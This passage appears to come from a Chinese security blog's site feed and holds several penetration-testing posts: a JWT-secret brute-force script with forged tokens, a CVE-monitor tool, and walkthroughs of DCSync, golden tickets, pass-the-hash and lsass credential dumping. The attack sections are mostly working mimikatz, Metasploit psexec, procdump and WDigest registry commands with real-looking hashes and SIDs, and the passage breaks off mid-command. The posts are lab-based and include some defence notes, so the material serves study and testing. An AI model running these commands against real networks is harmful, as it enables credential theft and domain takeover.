apl">eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJodHRwOi8vZGVtby5zam9lcmRsYW5na2VtcGVyLm5sLyIsImlhdCI6MTYxNTAxNTE0MywiZXhwIjoxNjE1MDE2MzQzLCJkYXRhIjp7IkpXVCI6IlJTMjU2IC0-IEhTMjU2IHRlc3QgIn19.HWN7y4FVaRZMNHiCWwcGuEOruLpPYKw_UOtNj4iXbC8<br></code></pre></td></tr></table></figure><p>提交JWT，攻击成功</p><p><img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210306152109.png" alt="image-20210306152039256"></p><h4 id="3-4-暴力破解密钥"><a href="#3-4-暴力破解密钥" class="headerlink" title="3.4 暴力破解密钥"></a>3.4 暴力破解密钥</h4><p>当 alg 指定 HMAC 类对称加密算法时，可以进行针对 key 的暴力破解，比如当算法为HS256，HS256算法使用密钥对消息进行签名和验证，如果知道密钥，则可以创建自己的签名消息。所有当密钥不够牢固时，则可以使用蛮力或<a href="https://github.com/wallarm/jwt-secrets">字典</a>攻击将其破解。</p><p>靶场：<a href="http://demo.sjoerdlangkemper.nl/jwtdemo/hs256.php">http://demo.sjoerdlangkemper.nl/jwtdemo/hs256.php</a></p><p>使用python脚本进行字典破解，将下方的 jwt_json 换成自己的值，字典可以从 <a href="https://github.com/wallarm/jwt-secrets">https://github.com/wallarm/jwt-secrets</a> 获取 </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python3</span><br><span class="hljs-comment"># -*- coding:utf-8 -*-</span><br><span class="hljs-comment"># @Author : yhy</span><br><span class="hljs-comment"># jwt 暴力破解脚本</span><br><br><span class="hljs-keyword">import</span> jwt<br><br>jwt_json=<span class="hljs-string">&#x27;eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJodHRwOlwvXC9kZW1vLnNqb2VyZGxhbmdrZW1wZXIubmxcLyIsImlhdCI6MTYxNTAyMTAzNiwiZXhwIjoxNjE1MDIyMjM2LCJkYXRhIjp7ImhlbGxvIjoid29ybGQifX0.x_ENVoZZRSDnjUqKHOAOYvTDrAtzfLw-_i02Qqry7so&#x27;</span><br><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;jwt.secrets.list&#x27;</span>, encoding=<span class="hljs-string">&#x27;utf-8&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>    <span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> f:<br>        key = line.strip()<br>        <span class="hljs-keyword">try</span>:<br>            jwt.decode(jwt_json, verify=<span class="hljs-literal">True</span>, key=key, algorithms=<span class="hljs-string">&#x27;HS256&#x27;</span>)<br>            print(<span class="hljs-string">&#x27;found key! --&gt; &#x27;</span> +  key)<br>            <span class="hljs-keyword">break</span><br>        <span class="hljs-keyword">except</span>(jwt.exceptions.ExpiredSignatureError, jwt.exceptions.InvalidAudienceError, jwt.exceptions.InvalidIssuedAtError, jwt.exceptions.InvalidIssuedAtError, jwt.exceptions.ImmatureSignatureError):<br>            print(<span class="hljs-string">&#x27;found key! --&gt; &#x27;</span> +  key)<br>            <span class="hljs-keyword">break</span><br>        <span class="hljs-keyword">except</span>(jwt.exceptions.InvalidSignatureError):<br>            print(<span class="hljs-string">&#x27;verify key! --&gt;&#x27;</span> + key)<br>            <span class="hljs-keyword">continue</span><br>    <span class="hljs-keyword">else</span>:<br>        print(<span class="hljs-string">&quot;key not found!&quot;</span>)<br></code></pre></td></tr></table></figure><p>运行</p><p><img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210306170654.png" alt="image-20210306165921066"></p><p>爆破出密钥为：<code>secret</code>，借助 <a href="https://jwt.io/#debugger">https://jwt.io/#debugger</a>  即可进行消息的恶意伪造，篡改，</p><p><img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210306170702.png" alt="image-20210306165956842"></p><p>将左侧 jwt 复制发送，攻击成功</p><p><img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210306170715.png" alt="image-20210306170013690"></p><p>字典跑不出时，还可以使用 <a href="https://github.com/brendan-rius/c-jwt-cracker">https://github.com/brendan-rius/c-jwt-cracker</a>  工具进行暴力破解</p>]]></content>
    
    
    <categories>
      
      <category>Web渗透</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Web渗透</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>gitHub_cve_monitor</title>
    <link href="/2021/02/25/github_cve_monitor/"/>
    <url>/2021/02/25/github_cve_monitor/</url>
    
    <content type="html"><![CDATA[<blockquote><p>没事少矫情，有空多赚钱。</p></blockquote><h2 id="监控github上新增的cve编号项目漏洞，推送钉钉或者server酱"><a href="#监控github上新增的cve编号项目漏洞，推送钉钉或者server酱" class="headerlink" title="监控github上新增的cve编号项目漏洞，推送钉钉或者server酱"></a>监控github上新增的cve编号项目漏洞，推送钉钉或者server酱</h2><h2 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h2><p>项目地址：<a href="https://github.com/yhy0/github-cve-monitor.git">https://github.com/yhy0/github-cve-monitor.git</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">python3 -m pip install dingtalkchatbot<br>python3 github_cve_monitor.py<br></code></pre></td></tr></table></figure><p>每3分钟检测一次github是否有新的cve漏洞提交记录，若有则通过server酱和钉钉机器人推送（二者配置一个即可）</p><p>时间间隔修改在 58 行</p><p>建议使用<a href="https://www.runoob.com/linux/linux-comm-screen.html">screen命令</a>运行在自己的linux vps后台上，就可以愉快的接收各种cve了</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">screen -S github_cve<span class="hljs-comment">#创建一个screen，名字为github_cve，在新窗口运行本项目, 成功后直接叉掉该窗口, 项目就会在后台一直运行了</span><br><br>screen -ls <span class="hljs-comment">#查看创建的screen</span><br><br>screen -r github_cve<span class="hljs-comment">#连接github_cve后台screen，如果存在的话</span><br></code></pre></td></tr></table></figure><p>钉钉机器人配置在 33行的 dingding函数中，需要钉钉建群，添加钉钉机器人，复制 webhook 替换即可</p><p>server酱配置在 40行的 server 函数中，ps：因微信的原因，server酱的旧版将在2021年4月后下线，新版以企业微信为主，这里使用的是旧版，想改新版的话，搞个企业微信，从新配置server酱，使用新链接 sctapi.ftqq.com</p><p>具体查看server酱官方，<a href="http://sc.ftqq.com/">http://sc.ftqq.com/</a> ，配置简单，只需要将脚本中的uri换掉即可</p><p><a href="https://sct.ftqq.com/">server酱新版</a>支持多通道（微信、客户端、群机器人、邮件和短信）</p><h2 id="效果图"><a href="#效果图" class="headerlink" title="效果图"></a>效果图</h2><p><img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210225093627.png" alt="image-20210225090416314"></p><p><img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210225094630.jpg" alt="751614217534_.pic"></p><p><img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210225093635.png" alt="image-20210225092350481"></p><p>项目地址：<a href="https://github.com/yhy0/github-cve-monitor.git">https://github.com/yhy0/github-cve-monitor.git</a></p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul><li>  洛米唯熊     <a href="https://my.oschina.net/u/4581868/blog/4380482">https://my.oschina.net/u/4581868/blog/4380482</a></li><li>  kiang70      <a href="https://github.com/kiang70/Github-Monitor">https://github.com/kiang70/Github-Monitor</a></li></ul>]]></content>
    
    
    <categories>
      
      <category>GitHub工具</category>
      
    </categories>
    
    
    <tags>
      
      <tag>GitHub工具</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>域渗透-DCSync和黄金票据</title>
    <link href="/2021/02/21/%E5%9F%9F%E6%B8%97%E9%80%8F-DCSync%E5%92%8C%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE/"/>
    <url>/2021/02/21/%E5%9F%9F%E6%B8%97%E9%80%8F-DCSync%E5%92%8C%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE/</url>
    
    <content type="html"><![CDATA[<blockquote><p>  新年开工快乐～～～</p></blockquote><h1 id="域渗透-DCSync和黄金票据"><a href="#域渗透-DCSync和黄金票据" class="headerlink" title="域渗透-DCSync和黄金票据"></a>域渗透-DCSync和黄金票据</h1><h2 id="0x01-概述"><a href="#0x01-概述" class="headerlink" title="0x01 概述"></a>0x01 概述</h2><blockquote><p>krbtgt账户：每个域控制器都有一个”krbtgt”的用户账户，是KDC的服务账户，用来创建票据授予服务（TGS）  加密的密钥。</p><p>黄金票据（Golden Ticket）：它能让黑客在拥有普通域用户权限和krbtgt hash的情况下，获取域管理员权限。</p><p>DCSync：mimikatz中的功能，能够模拟域控制器并从域控制器导出帐户密码hash。</p></blockquote><p>在域内，不同DC之间，每15分钟都会有一次域数据的同步。实现不登录到域控制器上，而获取域控制器数据库中的数据。</p><p>在DCSync功能出现之前，要想获得域用户的哈希，需要登录域控制器，在域控制器上执行代码才能获得域用户的哈希。2015年8月，新版的mimikatz增加了DCSync的功能，该功能可以模仿一个域控DC，从真实的域控中请求数据，如用户的哈希。该功能最大的特点就是在于不用登陆域服务器，即可远程通过域数据同步复制的方式获得想要的用户口令信息。</p><p>需要注意的是，DCSync攻击的对象如果是只读域控制器(RODC)，则会失效，因为RODC是不能参与复制同步数据到其他DC的。 </p><p>DCSync的原理非常清晰，利用域控制器之间的数据同步复制：</p><ul><li><p>  发现网络中的目标域控制器</p></li><li><p>通过DRS服务的GetNCChanges接口发起数据同步请求，Directory Replication Service（DRS）Remote Protocol</p><blockquote><p>GetNCChanges：当一个DC（成为客户端DC）想从其他DC（成为服务端DC）获取数据时，客户端DC会向服务端DC发起一个GetNCChanges请求。回应的数据包括需要同步的数据。如果需要同步的数据比较多，则会重复上述过程，毕竟每次回应的数据有限。</p></blockquote></li></ul><p>默认情况下，只有和Domain Controllers和Enterprise Domain Admins权限能够使用DCSync，但我们可以对域内普通用户添加ACL(Access Control List)实现普通用户调用DCSync导出域内所有用户的hash。</p><h2 id="0x02-利用DCSync导出域内用户Hash"><a href="#0x02-利用DCSync导出域内用户Hash" class="headerlink" title="0x02 利用DCSync导出域内用户Hash"></a>0x02 利用DCSync导出域内用户Hash</h2><h4 id="利用条件：获得以下任一的权限"><a href="#利用条件：获得以下任一的权限" class="headerlink" title="利用条件：获得以下任一的权限"></a>利用条件：获得以下任一的权限</h4><ul><li>  Administrators组内的用户</li><li>  Domain Admins组内的用户</li><li>  Enterprise Admins组内的用户</li><li>  域控制器的计算机帐户</li></ul><h4 id="利用原理"><a href="#利用原理" class="headerlink" title="利用原理"></a>利用原理</h4><p>利用DRS(Directory Replication Service)协议通过IDL_DRSGetNCChanges从域控制器复制用户凭据。</p><p>获取相应权限后(这里实验的是域内机器win7，域控为win8上，登录的域内用户yhy)</p><p><img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210221224807.png" alt="image-20210221165619981"></p><h4 id="使用mimikatz导出指定域用户的信息-包括哈希"><a href="#使用mimikatz导出指定域用户的信息-包括哈希" class="headerlink" title="使用mimikatz导出指定域用户的信息(包括哈希)"></a>使用<code>mimikatz</code>导出指定域用户的信息(包括哈希)</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apl">lsadump::dcsync &#x2F;domain:test.yhy &#x2F;user:administrator &#x2F;csv<br>lsadump::dcsync &#x2F;domain:test.yhy &#x2F;user:administrator<br></code></pre></td></tr></table></figure><p><img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210221224813.png" alt="image-20210221171218395"></p><p>获得了域内用户的hash后，进一步利用可参考之前的文章：<a href="http://mp.weixin.qq.com/s?__biz=MzkzODIwMTIwNg==&mid=2247483885&idx=1&sn=edaa58066c4128f53adae0d8f048bff7&chksm=c28298f4f5f511e2e3fc11813896af4f457ba302ee52911562bedac8dd8977fd748e7b9a1982#rd">哈希传递攻击</a></p><h2 id="0x03生成黄金票据，获取域管理权限"><a href="#0x03生成黄金票据，获取域管理权限" class="headerlink" title="0x03生成黄金票据，获取域管理权限"></a>0x03生成黄金票据，获取域管理权限</h2><p>获取<code>krbtgt</code>（域内默认创建的账号）账户Hash</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apl">lsadump::dcsync &#x2F;domain:test.yhy &#x2F;user:krbtgt &#x2F;csv<br></code></pre></td></tr></table></figure><p><img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210221224823.png" alt="image-20210221223933475"></p><p>生成黄金票据，并使用</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apl">kerberos::golden &#x2F;krbtgt:8a4f49ff2d2eedf30b5e565e4332d0b5 &#x2F;admin:administrator &#x2F;domain:test.yhy &#x2F;sid:S-1-5-21-2604854395-1602356619-879117556-502 &#x2F;ticket:administrator.ticket.bin<br><br>kerberos::ptt administrator.ticket.bin<br></code></pre></td></tr></table></figure><p><img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210221224829.png" alt="image-20210221223253549"></p><p>提升到域管理权限成功</p><p><img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210221224837.png" alt="image-20210221223505092"></p><p><img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210221224841.png" alt="image-20210221223535054"></p><h2 id="0x04-防御"><a href="#0x04-防御" class="headerlink" title="0x04 防御"></a>0x04 防御</h2><p>DCSync攻击的原理是模拟域控制器发起服务器之间的数据同步复制。最好的防御方法是给控制器设置白名单，在域内，域控制器的数量、IP地址、MAC地址是非常明确清晰的资产，将这些资产设置在允许同步的白名单内。非白名单的IP不允许发生数据同步。</p>]]></content>
    
    
    <categories>
      
      <category>域渗透</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Windows提权</tag>
      
      <tag>域渗透</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>哈希传递</title>
    <link href="/2021/02/14/%E5%93%88%E5%B8%8C%E4%BC%A0%E9%80%92%E6%94%BB%E5%87%BB/"/>
    <url>/2021/02/14/%E5%93%88%E5%B8%8C%E4%BC%A0%E9%80%92%E6%94%BB%E5%87%BB/</url>
    
    <content type="html"><![CDATA[<blockquote><p>  笙歌间错华筵启。喜新春新岁。菜传纤手青丝细。和气入、东风里。</p><p>  幡儿胜儿都姑媂。戴得更忔戏。愿新春以后，吉吉利利，百事都如意。 </p></blockquote><h2 id="0x01-哈希传递攻击概念"><a href="#0x01-哈希传递攻击概念" class="headerlink" title="0x01 哈希传递攻击概念"></a>0x01 哈希传递攻击概念</h2><p>在域环境中，用户登录计算机时使用的大都是域账号，大量计算机在安装时会使用相同的本地管理员账号和密码，因此，如果计算机的本地管理员账号和密码也是相同的，攻击者就能使用哈希传递攻击的方法登陆内网中的其他计算机。</p><p>在Windows系统中，通常会使用NTLM身份认证，NTLM认证不使用明文口令，而是使用口令加密后的hash值，hash值由系统API生成(例如LsaLogonUser)。攻击者获得有效的用户名和用户密码哈希值后，他们便能够使用该信息通过LM或NTLM身份验证向远程服务器或服务进行身份验证，而无需进行<strong>暴力破解</strong>散列以获取明文密码（此技术发布之前需要此密码）。该攻击利用了身份验证协议中的一种实现缺陷，即每次<strong>会话之间</strong>的密码散列保持静态，直到下次更改密码为止。</p><p>从Windows Vista和Windows Server 2008开始，微软默认禁用LM hash。在Windows Server 2012 R2及之后版本的操作系统中，默认不会在内存中保存明文密码，Mimikatz 就读不到密码明文，只能读取哈希值。虽然此时可以通过修改注册表的方式抓取明文，但需要用户重新登录后才能成功抓取。修改注册表命令为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apl">reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest &#x2F;v UseLogonCredential &#x2F;t REG_DWORD &#x2F;d 1 &#x2F;f<br></code></pre></td></tr></table></figure><p>但是，这种方式要求系统重启或者用户重新登录，在实战中操作起来成功率还是比较低的。如果攻击者拥有用户密码的哈希值，则无需强行使用明文密码；他们可以简单地使用他们已经收获的任意用户帐户的哈希值来针对远程系统进行身份验证并模拟该用户。换句话说，从攻击者的角度来看，哈希在功能上等同于生成它们的原始密码。</p><p>因此，攻击者如果使用工具将散列值传递到其他计算机中，进行权限验证，就能够在身份验证的时候模拟该用户(即跳过调用API生成hash的过程)，实现对计算机的控制。</p><h2 id="0x02-利用方法"><a href="#0x02-利用方法" class="headerlink" title="0x02 利用方法"></a>0x02 利用方法</h2><h3 id="环境搭配"><a href="#环境搭配" class="headerlink" title="环境搭配"></a>环境搭配</h3><p>域搭建可以参考<a href="http://mp.weixin.qq.com/s?__biz=MzkzODIwMTIwNg==&mid=2247483820&idx=1&sn=f49f393a5698e366df99ddd0d9269829&chksm=c28298b5f5f511a36cd92fb722ce3b0658a9ee6195f5ad3f89266a4dc2ac3f022fdc8d5b578e#rd">Windows组策略提权实验</a></p><p>将一台win7添加到域控（win8）中</p><p><img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210214160244.png" alt="image-20210214145116625"></p><p>登录一下域账户，之后退出域账户，然后切换为本地账户</p><p><img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210214160250.png" alt="image-20210214145726732"></p><p>切换本地账户</p><p><img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210214160257.png" alt="image-20210214145957319"></p><h3 id="Mimikatz-交互式获取"><a href="#Mimikatz-交互式获取" class="headerlink" title="Mimikatz 交互式获取"></a>Mimikatz 交互式获取</h3><p>读取lsass进程的信息，获取hash</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apl">privilege::debug<br>sekurlsa::logonPasswords<br></code></pre></td></tr></table></figure><p><img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210214160302.png" alt="image-20210214152209729"></p><p>获取终端</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apl">privilege::debug<br>sekurlsa::pth &#x2F;user:administrator &#x2F;domain:workgroup &#x2F;ntlm:4075bdc2e63781b034a034102356063a<br></code></pre></td></tr></table></figure><p><img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210214160306.png" alt="image-20210214152128620"></p><p>会弹出一个交互式的终端,这个终端以及伪造为我们指定的hash和用户，可以直接访问smb服务，我们可以通过copy文件，然后执行计划任务去拿到shell（使用atexec攻击）。</p><p><img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210214160310.png" alt="image-20210214152835360"></p><h3 id="Metasploit"><a href="#Metasploit" class="headerlink" title="Metasploit"></a>Metasploit</h3><p>需要使用<code>exploit/windows/smb/psexec</code></p><p>注意这里填入的哈希是<code>LM Hash:NTLM Hash</code>, 当系统默认不支持LM hash，LM hash可以设定为任意值。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs apl">use exploit&#x2F;windows&#x2F;smb&#x2F;psexec<br>set payload windows&#x2F;meterpreter&#x2F;bind_tcp<br>set RHOST 172.16.27.10<br>set smbuser administrator<br>set SMBPass 00000000000000000000000000000000:4075bdc2e63781b034a034102356063a<br>run<br></code></pre></td></tr></table></figure><p><img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210214160316.png" alt="image-20210214154108503"></p><p>当然还有一些其它利用方法，比如：Cobalt Strike 抓取、powershell读取、 SAM表离线获取hash、wmiexec利用hash获取shell等等</p><h2 id="0x03-防范措施"><a href="#0x03-防范措施" class="headerlink" title="0x03 防范措施"></a>0x03 防范措施</h2><h3 id="KB2871997补丁的影响"><a href="#KB2871997补丁的影响" class="headerlink" title="KB2871997补丁的影响"></a>KB2871997补丁的影响</h3><p>防范首先想到打补丁，微软也早在2014年5月发布了KB2871997补丁，该补丁禁止通过本地管理员权限与远程计算机进行连接，其后果就是：无法通过本地管理员权限对远程计算机使用Psexec、WMI、smbecec等，也无法访问远程的文件共享等。</p><p>但实际上就算打了KB2871997补丁后，Administrator账号(SID为500)也是例外的，使用该账户的NTLM Hash依然可以进行哈希传递。</p><blockquote><p>  KB2871997补丁并不能真正防止哈希传递，只是在一定程度上缓解了PTH的问题。</p><p>  浅探内网横向移动-Pass The Hash  <a href="https://xz.aliyun.com/t/8117#toc-11">https://xz.aliyun.com/t/8117#toc-11</a></p><p>  KB22871997是否真的能防御PTH攻击？<a href="https://www.anquanke.com/post/id/193150">https://www.anquanke.com/post/id/193150</a></p></blockquote><h3 id="防御-mimikatz-攻击"><a href="#防御-mimikatz-攻击" class="headerlink" title="防御 mimikatz 攻击"></a>防御 mimikatz 攻击</h3><p>mimikatz在抓取散列值或明文密码时，需要用到Debug权限（因为mimikatz需要和lsass进程进行交互，如果没有Debug权限，mimikatz将不能读取lsass进程里的密码）。而Debug权限归本地管理员Administrator所有,目的是确定哪些用户可以将调试器附加到任何进程或内核中，但一般Administrator不会用到这个权限(除非是系统进程)。<br><img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210214160322.png" alt="image-20210214155950651"></p><p>所以在配置用户权限时，可以将拥有Debug权限的本地管理员从Administrator组中移除。重启系统之后，在运行mimikatz，在第一步”privilege::debug”时就会报错了。</p>]]></content>
    
    
    <categories>
      
      <category>域渗透</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Windows提权</tag>
      
      <tag>域渗透</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Windows系统散列值获取</title>
    <link href="/2021/02/07/Windows%E7%B3%BB%E7%BB%9F%E6%95%A3%E5%88%97%E5%80%BC%E8%8E%B7%E5%8F%96/"/>
    <url>/2021/02/07/Windows%E7%B3%BB%E7%BB%9F%E6%95%A3%E5%88%97%E5%80%BC%E8%8E%B7%E5%8F%96/</url>
    
    <content type="html"><![CDATA[<blockquote><p>  明年今日，人生一大喜事(≧∇≦)ﾉ  弱弱问一句我很胖吗？183 165</p></blockquote><h1 id="Windows系统散列值获取"><a href="#Windows系统散列值获取" class="headerlink" title="Windows系统散列值获取"></a>Windows系统散列值获取</h1><h2 id="0x01-LM-Hash与NTLM-Hash"><a href="#0x01-LM-Hash与NTLM-Hash" class="headerlink" title="0x01 LM Hash与NTLM Hash"></a>0x01 LM Hash与NTLM Hash</h2><p>Windows操作系统通常使用两种方法对用户的明文密码进行加密处理。在域环境中，用户信息存储在<code>ntds.dit</code>中，加密后为散列值。</p><p>Windows操作系统中的密码一般由两部分组成，一部分为LM Hash，另一部分为NTLM Hash。在Windows操作系统中，Hash的结构通常如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apl">username:RID:LM-HASH:NT-HASH<br></code></pre></td></tr></table></figure><blockquote><p>  LM Hash的全名为”LAN Manager Hash”，是微软为了提高Windows操作系统的安全性而采用的散列值加密算法，其本质是DES加密。尽管LM Hash比较容易破解，但是为了保证系统的兼容性，Windows只是将LM Hash禁用了（从 Windows Vista 和 Windows 2008 版本开始禁用）。如果LM Hash被禁用了，攻击者通过工具抓取的LM Hash值通常是”aad3b435b51404eeaad3b435b51404ee”(表示LM Hash值为空或者被禁用)。</p><p>  NTLM Hash是微软为了在提高安全性的同时保证兼容性而设计的散列加密算法。NTLM Hash是基于MD4加密算法进行加密的。个人版从Windows Vista 以后，服务器版从Windows Server 2003以后，Windows操作系统的认证方式均为NTLM Hash。</p></blockquote><h2 id="0x02-散列值获取方法"><a href="#0x02-散列值获取方法" class="headerlink" title="0x02 散列值获取方法"></a>0x02 散列值获取方法</h2><p>要想在Windows操作系统中抓取散列值或明文密码，必须将权限升级至System。本地用户名，散列值和其它安全验证信息都保存在SAM文件中。lsass.exe进程(它用于本地安全和登陆策略)用于实现Windows的安全策略，可以使用工具将散列值和明文密码从内存中的lsass.exe进程或SAM文件中导出。</p><p>利用前提：拿到了管理员权限的cmd，管理员用密码登录过机器，并运行了lsass.exe进程，把密码保存在内存文件lsass进程中。</p><p>在<strong>KB2871997</strong>之前， 使用 Mimikatz 可以直接抓取明文密码。</p><p>当服务器安装 <strong>KB2871997</strong> 补丁后，系统默认禁用 Wdigest Auth（<strong>Windows 2012及以上版本</strong>） ，内存（lsass进程）不再保存明文口令。Mimikatz 将读不到密码明文。<br>    但由于一些系统服务需要用到 Wdigest Auth，所以该选项是可以手动开启的。（开启后，需要用户重新登录才能生效）之后通过手工修改注册表 + 强制锁屏 + 等待目标系统管理员重新登录 = 截取明文密码</p><h3 id="使用mimikatz在线读取SAM文件（目标没有杀软，或者mimikatz已免杀）"><a href="#使用mimikatz在线读取SAM文件（目标没有杀软，或者mimikatz已免杀）" class="headerlink" title="使用mimikatz在线读取SAM文件（目标没有杀软，或者mimikatz已免杀）"></a>使用mimikatz在线读取SAM文件（目标没有杀软，或者<code>mimikatz</code>已免杀）</h3><p>直接将<code>mimikatz</code>上传至目标机器</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apl">mimikatz.exe &quot;privilege::debug&quot; &quot;log&quot; &quot;sekurlsa::logonpasswords&quot;    #在线读取散列值及铭文密码<br></code></pre></td></tr></table></figure><p>该操作需要管理员权限，否则报错，无法读取密码，报错信息如下</p><p><img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210207221939.png" alt="image-20210207221937863"></p><p>管理员权限执行</p><p><img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210207221945.png" alt="image-20210207221846491"></p><h4 id="使用mimikatz离线读取lsass-dmp文件（mimikatz被杀软拦截）"><a href="#使用mimikatz离线读取lsass-dmp文件（mimikatz被杀软拦截）" class="headerlink" title="使用mimikatz离线读取lsass.dmp文件（mimikatz被杀软拦截）"></a>使用mimikatz离线读取lsass.dmp文件（mimikatz被杀软拦截）</h4><p>（1）导出<code>lsass.dmp</code>文件</p><p>通过 <code>procdump.exe</code> 文件导出<code>lsass.dmp</code>文件（Procdump是微软官方发布的工具，可以在命令行下将目标lsass文件导出，且杀毒软件不会拦截）</p><p><code>procdump</code>下载地址：<a href="https://docs.microsoft.com/zh-cn/sysinternals/downloads/procdump">https://docs.microsoft.com/zh-cn/sysinternals/downloads/procdump</a></p><p><strong>管理员权限运行</strong>该命令</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apl">procdump.exe -accepteula -ma lsass.exe lsass.dmp<br></code></pre></td></tr></table></figure><p><img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210207215155.png" alt="image-20210207214123607"></p><p>(2）使用mimikatz导出lsass.dmp文件中的密码散列值</p><p>将目标机器上的 <code>lsass.tmp</code> 拉取到本地，与<code>mimikatz</code>同目录，使用<code>mimikatz</code>解密目标系统密码。（本地机器需与目标机器的版本位数一致）</p><p>运行mimikatz.exe 解密该文件。注：32位就用32位的<code>mimikatz</code>破解，同理64位的也是。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apl">sekurlsa::minidump lsass.dmp<br></code></pre></td></tr></table></figure><p><img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210207213854.png" alt="image-20210207213852318"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apl">sekurlsa::logonpasswords full<br></code></pre></td></tr></table></figure><p><img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210207214737.png" alt="image-20210207214733408"></p><h4 id="mimikatz无法读取到密码时"><a href="#mimikatz无法读取到密码时" class="headerlink" title="mimikatz无法读取到密码时"></a>mimikatz无法读取到密码时</h4><p>在默认情况下，当系统为<strong>Windows 2012R2</strong>以上或者安装 <strong>KB2871997</strong> 补丁时，默认在内存缓存中禁止保存明文密码，密码字段显示为null，此时可以通过以下方式开启，但需要用户重新登录后才能成功抓取。</p><p><strong>开启Wdigest Auth</strong></p><ul><li><p>cmd</p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apl">reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest &#x2F;v UseLogonCredential &#x2F;t REG_DWORD &#x2F;d 1 &#x2F;f<br></code></pre></td></tr></table></figure></li><li><p>powershell</p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apl">Set-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest 